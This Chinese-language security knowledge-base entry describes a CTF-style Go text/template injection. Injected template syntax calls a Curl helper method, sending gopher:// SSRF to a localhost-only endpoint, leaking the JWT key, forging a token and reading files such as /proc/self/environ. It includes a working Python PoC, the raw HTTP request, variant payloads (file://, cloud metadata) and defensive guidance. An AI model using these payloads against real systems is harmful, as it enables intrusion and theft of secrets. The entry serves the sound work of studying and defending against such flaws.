---
id: web-golang-text-template-method-call-curl-gopher-ssrf-localfile
title: Go text/template SSTI 调出结构体方法：{{.Curl "gopher://..."}} 打本机 PUT 接口改配置，把任意文件读成“签名”回显
type: scenario
domain: web
path: web/golang
technique: go-ssti-method-call-gopher-ssrf-config-write-file-read
aliases:
- Go SSTI 方法调用
- text/template 调用结构体方法
- '{{.Curl}} SSRF'
- gopher 打本机 PUT
- Go SSTI 到任意文件读取
- 模板里读 JwtKey
tags:
- go
- golang
- ssti
- text-template
- ssrf
- gopher
- jwt
- file-read
- curl
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:49:28+08:00'
  notes: 已对照原文核对；本次核对未读取图片；utils.go/main.go 中 strings.Replace(...,%s,input) 后 template.Parse 的注入点、Helper.Curl 的 exec.Command(curl,-fsSL,--,url)、routeFavorite 的 RemoteAddr 本机判断 + Name==Papa 校验 + SignaturePath 赋值、以及 GET 分支 ReadFile 后 Execute 回显，均与正文源码一致；{{.Config.JwtKey}} 泄露与 gopher 报文拼装与正文两条 exp 脚本一致；PoC 未对真实目标执行；原文为自研 Go 题目，无受影响版本
---

## 一句话结论

Go 的 `text/template` 不只是“读字段”：`{{ .Method "arg" }}` 会反射调用渲染数据上的导出方法。当渲染数据是带业务方法的 Helper 结构体时，SSTI 就等于“调用任意导出方法”——本题用 `{{ .Curl "gopher://127.0.0.1:8000/_<原始报文>" }}` 让服务自己去请求只监听/只允许本机访问的 PUT 接口，把 `config.SignaturePath` 改成 `/proc/self/environ`，随后 GET 该接口把文件内容当“签名”渲染回来，完成任意文件读取；而 `{{ .Config.JwtKey }}` 先泄露了随机生成的 JWT 密钥，用于伪造通过 `Name=="Papa"` 校验的令牌。

## 原理

- **模板即反射调用面**：`text/template` 对 `{{ .X }}` 解析字段、对 `{{ .X.Y }}` 逐级取字段、对 `{{ .F "a" }}` 调用无返回值个数限制的**导出方法**（参数按签名转换）。因此“模板可控”等价于“可调用数据结构上所有导出方法”，而不只是读数据。
- **本题的数据结构自带危险方法**：
  ```go
  type Helper struct { Stringer; User string; Config Config }
  func (c Helper) Curl(url string) string { exec.Command("curl","-fsSL","--",url) ... }
  ```
  渲染时传入的正是 `Helper{User: user, Config: config}`，所以模板里能直接调 `Curl`。
- **SSTI 的成因是拼接而非渲染**：`routeEye` 读 `views/eye.html`，把 `%s` 用 `strings.Replace(..., input, -1)` 替换掉用户输入 `input`，再 `template.Parse` 并 `Execute`。用户输入在**解析前**就进入了模板源码，因此 `{{ }}` 会被当作语法执行，而不是被转义成文本。
- **配置里的密钥被模板直接读到**：`Config.JwtKey = RandString(64)` 虽然是随机生成（不可猜），但它作为渲染数据的字段存在，`{{ .Config.JwtKey }}` 直接回显，随机性归零。
- **SSRF 用 curl 二进制而非 HTTP 客户端**：`Curl` 调的是系统 `curl`，支持 `gopher://`——可以把任意 TCP 原始报文发给目标。服务端对 `PUT /favorite` 有 `r.RemoteAddr` 必须是 `127.0.0.1`/`[::1]` 的判断，外部请求过不去，但“由服务端自己 curl 自己”就是本机来源。
- **PUT 之后 GET 读文件**：`routeFavorite` 的 PUT 分支在校验 `validateJwt(...).Name == "Papa"` 后执行 `config.SignaturePath = string(body)`；GET 分支 `ioutil.ReadFile(config.SignaturePath)` 并把内容 `tmpl.Execute(w, string(sig))` 渲染进页面。于是“改路径 + 读文件 + 回显”三步齐备，读 `/proc/self/environ` 即拿到 `FLAG=` 环境变量。
- **JWT 校验只限制算法族**：`validateJwt` 里 `if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { error }`，即只接受 HMAC 族，密钥用 `config.JwtKey`——所以拿到 key 后用 HS256 签 `{"user":"Papa"}` 即可通过。

## 触发条件

- 模板源码由用户输入拼接（`strings.Replace`/`fmt.Sprintf`/字符串相加后 `template.Parse`），而不是把用户输入作为 `Execute` 的数据。
- 渲染数据结构（或其嵌入字段）上有导出方法，且方法能发起网络请求、执行命令、读写文件。
- 存在一个“只允许本机/内网访问”的接口，可被 curl/gopher 打中；本题是该 PUT 改配置 + GET 读文件。
- 需要伪造身份时，签名密钥可从模板读到（或可猜/固定）。

## 利用步骤

1. 确认注入点：`GET /eye?input={{ .User }}` 观察是否渲染出用户名（说明 `{{ }}` 被解析）；再试 `{{ .Config }}`、`{{ .Config.JwtKey }}` 判断能取到哪些字段。
2. 泄露 JWT 密钥：`{{ .Config.JwtKey }}`，从响应中正则抠出 64 字符 key。
3. 用 HS256 签一个 `{"user":"Papa"}` 的令牌（`exp` 可加，注意服务端 `jwt.Parse` 会用 MapClaims 解析）。
4. 构造要发给本机 PUT 接口的原始 HTTP 报文（`PUT /favorite HTTP/1.1` + `Host` + `Cookie: token=<伪造>` + `Content-Length` + 空行 + 目标文件路径），行分隔必须是 `\r\n`。
5. 把报文整体做 URL 编码，包进 `gopher://localhost:8000/_<编码后报文>`，再放进模板：`{{ .Curl "gopher://localhost:8000/_..." }}`，通过 `/eye?input=` 提交（再次 URL 编码）。
6. 请求 `/favorite`，页面中“签名”位置即文件内容；读 `/proc/self/environ` 拿 `FLAG=`，或读 `/flag`、密钥文件。

## PoC

```python
import re, jwt, requests
from urllib.parse import quote

TARGET = "http://target:8000"

def render(expr):
    r = requests.get(TARGET + "/eye", params={"input": expr})
    m = re.search(r'<span id="output">(.*?)</span>', r.text, re.S)
    return m.group(1) if m else None

key = render("{{ .Config.JwtKey }}")                 # 泄露随机 JWT key
token = jwt.encode({"user": "Papa"}, key, algorithm="HS256")

def read_file(path):
    raw = (f"PUT /favorite HTTP/1.1\r\n"
           f"Host: localhost:8000\r\n"
           f"Content-Type: text/plain\r\n"
           f"Cookie: token={token}\r\n"
           f"Content-Length: {len(path)}\r\n\r\n"
           f"{path}")
    gopher = "gopher://localhost:8000/_" + quote(raw, safe="")
    print("curl =>", render('{{ .Curl "%s" }}' % gopher))
    r = requests.get(TARGET + "/favorite")
    m = re.search(r'id="sign-text">(.*?)</div>', r.text, re.S)
    return m.group(1) if m else None

env = read_file("/proc/self/environ")
print(re.search(r"FLAG=([^\x00\r\n]+)", env).group(1))
```

原始报文示意（`\r\n` 结尾）：

```http
PUT /favorite HTTP/1.1
Host: localhost:8000
Content-Type: text/plain
Cookie: token=<HS256{"user":"Papa"}>
Content-Length: 18

/proc/self/environ
```

说明：PoC 按原文源码与 exp 脚本整理，未对真实目标执行；`Content-Length` 必须等于文件路径字节长度，否则 `ReadAll` 会截断或阻塞。

## 变体与关联

- **方法名变体**：结构体上任何导出方法都能调（`{{ .Save "..." }}`、`{{ .Fetch ... }}`、`{{ .Exec ... }}`）；Go 模板还支持 `{{ call .Fn "a" }}`、`{{ if .Check }}`、`{{ range .Items }}`，同样会触发方法。
- **SSRF 协议变体**：`curl` 支持 `gopher://`、`dict://`、`file://`（直接读本地文件，若版本允许 `file://` 则甚至不需要 PUT 改配置）、`http://169.254.169.254/`（云元数据）；没有 curl 时可用 `http.Get`、`net.Dial` 等等价方法。
- **写配置变体的通用形态**：“低权接口改全局配置字段 → 另一接口用该字段读文件/建连”这种 split 链在 Go/PHP/Java 里都常见，模板只是入口。
- **关联**：`web-golang-ollama-template-param-go-ssti-data-leak`（同语言同引擎的 `{{.System}}` 字段泄露，没有方法调用）、`web-golang-gopherblog-sqli-jwt-template-method-rce`（Go 模板方法调用直接 RCE 的形态）、`web-generic-ssrf-gopher-redis-cron-webshell`（gopher 打内网服务的通用手法）。
- **边界**：模板用 `{{ .User }}` 且用户输入作为 `Execute` 的数据（正确用法）时不成立；`text/template` 无法调用未导出方法、无法反射到任意包函数；`Curl` 若改用参数化 HTTP 客户端则 gopher 失效；目标无 `curl` 二进制时需换方法。

## 检测与防御

- **正确用法**：用户输入只能作为 `Execute(w, data)` 的数据，绝不参与 `Parse` 的源码；需要动态片段时用 `template.HTML` 之外的显式模板集合（`ParseFiles` 固定列表）+ 数据传参。
- **收窄方法面**：传给模板的结构体只放“纯数据”，不要嵌入带 IO/命令/网络能力的方法；把 `Curl` 这类能力移到模板数据之外。
- **出网与来源校验**：`RemoteAddr` 判断不能作为权限边界（本机 SSRF 即可绕过），本机接口应加独立鉴权；限制服务进程出网（curl/gopher/dict）。
- **密钥管理**：JWT 密钥即使随机生成，也不能出现在任何可渲染的数据结构里；密钥只应存在于签名/校验函数的闭包或配置读取器中。
- **检测**：请求参数中出现 `{{`、`}}`、`.Config`、`.Curl`、`gopher://`、`%7B%7B`；`/eye` 的响应里出现 64 字符随机串；进程出现 `curl -fsSL -- gopher://` 子进程；`/favorite` 的 PUT 来源为本机但携带外来 token。
